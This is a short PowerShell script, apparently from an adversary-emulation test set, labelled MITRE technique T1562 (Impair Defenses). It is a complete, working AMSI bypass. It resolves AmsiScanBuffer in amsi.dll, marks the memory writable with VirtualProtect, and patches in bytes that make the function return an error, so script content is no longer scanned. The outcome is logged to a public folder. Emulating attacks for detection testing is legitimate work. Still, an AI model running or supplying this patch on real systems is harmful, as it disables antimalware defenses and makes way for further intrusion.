# Impair Defenses
# Technic ID : T1562
Clear-Host
Write-Output "==============================================================================="
Write-Output "Patch AMSI DLL : Impair Defenses (T1562)"
Write-Output "==============================================================================="
#
$exf_file ="$env:PUBLIC\exf\AMSI_Patch.log"; 
$Kernel32 = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Kernel32" -Namespace "Win32" -PassThru

$AmsiDll = $Kernel32::LoadLibrary("amsi.dll")
$AmsiScanBuffer = $Kernel32::GetProcAddress($AmsiDll, "AmsiScanBuffer")

# Ensure we successfully located AmsiScanBuffer
if ($AmsiScanBuffer -eq [IntPtr]::Zero) {
    Write-Output "Failed to find AmsiScanBuffer!" | Out-File -FilePath "$exf_file" -Encoding ascii -Append; 
    exit 1
}

# Patch: MOV EAX, 0x57 000780, RET
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

[UInt32]$oldProtect = 0
$Kernel32::VirtualProtect($AmsiScanBuffer, [UInt32]6, 0x40, [Ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $AmsiScanBuffer, $patch.Length)

Write-Output "AMSI Patched Successfully!" | Out-File -FilePath "$exf_file" -Encoding ascii -Append;
exit 0
